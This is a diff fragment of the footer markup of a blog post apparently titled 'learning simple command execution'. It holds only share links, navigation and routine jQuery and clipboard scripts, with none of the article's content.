+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://m4o9.github.io/2022/09/08/%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://m4o9.github.io/2022/09/08/%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AD%A6%E4%B9%A0/&text=简单命令执行的学习"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://m4o9.github.io/2022/09/08/%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=简单命令执行的学习"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://m4o9.github.io/2022/09/08/%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AD%A6%E4%B9%A0/&is_video=false&description=简单命令执行的学习"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=简单命令执行的学习&body=Check out this article: https://m4o9.github.io/2022/09/08/%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AD%A6%E4%B9%A0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://m4o9.github.io/2022/09/08/%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=简单命令执行的学习"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://m4o9.github.io/2022/09/08/%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=简单命令执行的学习"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://m4o9.github.io/2022/09/08/%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=简单命令执行的学习"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://m4o9.github.io/2022/09/08/%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=简单命令执行的学习"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://m4o9.github.io/2022/09/08/%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AD%A6%E4%B9%A0/&name=简单命令执行的学习&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://m4o9.github.io/2022/09/08/%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AD%A6%E4%B9%A0/&t=简单命令执行的学习"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    m4o9
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Archive</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/m4o9">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
